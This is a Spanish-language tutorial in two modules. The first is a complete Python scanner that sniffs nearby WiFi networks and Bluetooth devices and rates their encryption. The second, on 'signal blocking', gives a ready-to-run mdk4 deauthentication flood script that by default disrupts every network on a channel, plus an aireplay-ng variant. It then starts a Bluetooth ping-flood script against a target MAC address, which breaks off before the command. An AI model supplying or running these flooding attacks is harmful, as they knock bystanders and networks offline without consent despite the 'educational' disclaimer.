## рҹ“Ў MГіdulo 1: Scanner de Vulnerabilidades WiFi + Bluetooth

### ВҝQuГ© detecta?

```
WiFi
в”ңв”Җв”Җ SSID y BSSID de redes cercanas
в”ңв”Җв”Җ Tipo de cifrado (WEP, WPA, WPA2, WPA3, OPEN)
в”ңв”Җв”Җ Redes abiertas sin autenticaciГіn
в”ңв”Җв”Җ Redes ocultas (hidden SSID)
в””в”Җв”Җ Canal y potencia de seГұal (dBm)

Bluetooth
в”ңв”Җв”Җ Dispositivos visibles en rango
в”ңв”Җв”Җ DirecciГіn MAC BT
в”ңв”Җв”Җ Nombre del dispositivo
в”ңв”Җв”Җ Clase del dispositivo (telГ©fono, laptop, auricular...)
в””в”Җв”Җ Detecta modo "discoverable" innecesario
```

### Script Python completo

```python
#!/usr/bin/env python3
"""
WiFi + Bluetooth Vulnerability Scanner
Requiere: pip install scapy pybluez tabulate
Requiere: adaptador WiFi en modo monitor (airmon-ng start wlan0)
Ejecutar como root: sudo python3 wifi_bt_scanner.py
"""

import sys
import time
import threading
import collections
from datetime import datetime

try:
    from scapy.all import *
    from tabulate import tabulate
except ImportError:
    print("Instala dependencias: pip install scapy tabulate")
    sys.exit(1)

# в”Җв”Җ Almacenamiento de resultados в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җ
redes_wifi    = {}   # {bssid: {ssid, crypto, canal, potencia, timestamp}}
errores_wifi  = []   # redes con configuraciГіn dГ©bil

def clasificar_seguridad(crypto_set):
    """EvalГәa el nivel de seguridad del cifrado detectado."""
    if not crypto_set or 'OPN' in crypto_set:
        return "рҹ”ҙ ABIERTA (sin cifrado)"
    if 'WEP' in crypto_set:
        return "рҹ”ҙ WEP (roto, vulnerable)"
    if 'WPA' in crypto_set and 'WPA2' not in crypto_set:
        return "рҹҹЎ WPA (mejorable)"
    if 'WPA2' in crypto_set and 'WPA3' not in crypto_set:
        return "рҹҹў WPA2"
    if 'WPA3' in crypto_set:
        return "рҹҹў WPA3 (robusto)"
    return "вқ“ Desconocido"

def callback_wifi(pkt):
    """Callback para cada paquete capturado en modo monitor."""
    if not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeResp):
        return

    bssid = pkt.addr2
    if not bssid:
        return

    try:
        ssid = pkt.info.decode('utf-8', errors='replace') if pkt.info else "<Oculta>"
    except:
        ssid = "<Error de decodificaciГіn>"

    ssid = ssid if ssid.strip() else "<Red Oculta>"

    try:
        stats  = pkt.getlayer(Dot11Beacon).network_stats()
        crypto = stats.get('crypto', set())
        canal  = stats.get('channel', '?')
    except:
        crypto = set()
        canal  = '?'

    # Potencia de seГұal (dBm)
    potencia = getattr(pkt, 'dBm_AntSignal', '?')

    seguridad = clasificar_seguridad(crypto)

    redes_wifi[bssid] = {
        'ssid':      ssid,
        'crypto':    ', '.join(crypto) if crypto else 'OPEN',
        'seguridad': seguridad,
        'canal':     canal,
        'potencia':  f"{potencia} dBm",
        'visto':     datetime.now().strftime('%H:%M:%S')
    }

    # Marcar como vulnerable si es red abierta o WEP
    if 'OPN' in str(crypto) or 'WEP' in str(crypto):
        if bssid not in [e['bssid'] for e in errores_wifi]:
            errores_wifi.append({'bssid': bssid, 'ssid': ssid, 'problema': seguridad})

def scan_wifi(interfaz="wlan0mon", duracion=20):
    """Inicia el escaneo WiFi en modo monitor."""
    print(f"\n[*] Iniciando escaneo WiFi en {interfaz} por {duracion}s...")
    print("[*] Presiona Ctrl+C para detener antes\n")
    try:
        sniff(iface=interfaz, prn=callback_wifi, timeout=duracion, store=False)
    except PermissionError:
        print("вқҢ Se requieren permisos de root: sudo python3 scanner.py")
    except OSError as e:
        print(f"вқҢ Interfaz no disponible: {e}")
        print("   Activa modo monitor: sudo airmon-ng start wlan0")

def scan_bluetooth(duracion=10):
    """Escanea dispositivos Bluetooth en rango."""
    try:
        import bluetooth
    except ImportError:
        print("вқҢ PyBluez no instalado: pip install pybluez")
        return []

    print(f"\n[*] Escaneando Bluetooth por {duracion}s...")
    dispositivos = bluetooth.discover_devices(
        duration=duracion,
        lookup_names=True,
        lookup_class=True
    )

    resultados = []
    for addr, nombre, clase in dispositivos:
        # La clase del dispositivo indica el tipo (telГ©fono, PC, auricular...)
        tipo = interpretar_clase_bt(clase)
        resultados.append({
            'mac':    addr,
            'nombre': nombre or "<Sin nombre>",
            'tipo':   tipo,
            'riesgo': "рҹҹЎ Discoverable" if clase else "вқ“"
        })

    return resultados

def interpretar_clase_bt(clase):
    """Interpreta la clase de dispositivo Bluetooth."""
    major = (clase >> 8) & 0x1F
    tipos = {
        0: "MiscelГЎneo", 1: "Computadora", 2: "TelГ©fono",
        3: "Access Point", 4: "Audio/Video", 5: "PerifГ©rico",
        6: "Imagen", 7: "Wearable", 8: "Juguete"
    }
    return tipos.get(major, f"Clase {major}")

def mostrar_resultados_wifi():
    """Muestra tabla de redes WiFi detectadas."""
    if not redes_wifi:
        print("\n[!] No se detectaron redes WiFi")
        return

    print(f"\n{'в•җ'*70}")
    print(f"  REDES WiFi DETECTADAS ({len(redes_wifi)} total)")
    print(f"{'в•җ'*70}")

    filas = [
        [
            datos['ssid'][:30],
            bssid,
            datos['canal'],
            datos['potencia'],
            datos['seguridad']
        ]
        for bssid, datos in redes_wifi.items()
    ]

    print(tabulate(
        filas,
        headers=["SSID", "BSSID", "Canal", "SeГұal", "Seguridad"],
        tablefmt="rounded_grid"
    ))

    if errores_wifi:
        print(f"\n{'в•җ'*70}")
        print(f"  вҡ пёҸ  VULNERABILIDADES DETECTADAS ({len(errores_wifi)})")
        print(f"{'в•җ'*70}")
        filas_err = [[e['ssid'], e['bssid'], e['problema']] for e in errores_wifi]
        print(tabulate(filas_err, headers=["Red", "BSSID", "Problema"], tablefmt="rounded_grid"))

def mostrar_resultados_bt(dispositivos):
    """Muestra tabla de dispositivos Bluetooth."""
    if not dispositivos:
        print("\n[!] No se detectaron dispositivos Bluetooth")
        return

    print(f"\n{'в•җ'*60}")
    print(f"  DISPOSITIVOS BLUETOOTH ({len(dispositivos)} detectados)")
    print(f"{'в•җ'*60}")

    filas = [[d['nombre'], d['mac'], d['tipo'], d['riesgo']] for d in dispositivos]
    print(tabulate(filas, headers=["Nombre", "MAC", "Tipo", "Estado"], tablefmt="rounded_grid"))

# в”Җв”Җ Punto de entrada в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җ
if __name__ == "__main__":
    IFACE   = sys.argv[1] if len(sys.argv) > 1 else "wlan0mon"
    TIMEOUT = int(sys.argv[2]) if len(sys.argv) > 2 else 20

    print("в”Ңв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”җ")
    print("в”Ӯ  WiFi + Bluetooth Vulnerability Scanner          в”Ӯ")
    print("в”Ӯ  Solo para uso autorizado y entornos de lab     в”Ӯ")
    print("в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ")

    # Escaneo paralelo WiFi + BT
    thread_bt = threading.Thread(target=lambda: mostrar_resultados_bt(scan_bluetooth(10)))
    thread_bt.start()

    scan_wifi(IFACE, TIMEOUT)
    thread_bt.join()

    mostrar_resultados_wifi()
```

## рҹ“¶ MГіdulo 2: Bloqueo de SeГұales RFI, BT y WiFi

> вҡ пёҸ **El uso de inhibidores o jammers de seГұal es ilegal en la mayorГӯa de paГӯses sin licencias especГӯficas (operadores de telecomunicaciones, fuerzas de seguridad, entornos militares). Esta secciГіn es estrictamente educativa.**

### A. DeautenticaciГіn WiFi (Bash + mdk4)

Interrumpe conexiones en un canal enviando paquetes de deauth masivos.

```bash
#!/bin/bash
# Requiere: mdk4 (sudo apt install mdk4)
# Requiere: interfaz en modo monitor

IFACE="wlan0mon"
TARGET_BSSID=""   # Dejar vacГӯo = afecta todo el canal
CANAL=6

echo "[*] Activando modo monitor..."
sudo airmon-ng start wlan0

echo "[*] Iniciando deautenticaciГіn en canal $CANAL..."
# Modo d = deauthentication flood
# -c = canal especГӯfico
sudo mdk4 $IFACE d -c $CANAL ${TARGET_BSSID:+-b $TARGET_BSSID}

# Alternativa con aireplay-ng (mГЎs selectivo):
# sudo aireplay-ng --deauth 0 -a $TARGET_BSSID $IFACE
```

### B. SaturaciГіn Bluetooth (Bash)

```bash
#!/bin/bash
# Requiere: bluez-utils (sudo apt install bluez)
# Objetivo: direcciГіn MAC del dispositivo BT

TARGET_MAC="AA:BB:CC:DD:EE:FF"  # Cambiar por MAC objetivo

echo "[*] Iniciando ping flood Bluetooth a $TARGET_MAC..."
# -f = flood (envГӯo continuo)
# -s = tamaГұo del paquete
```
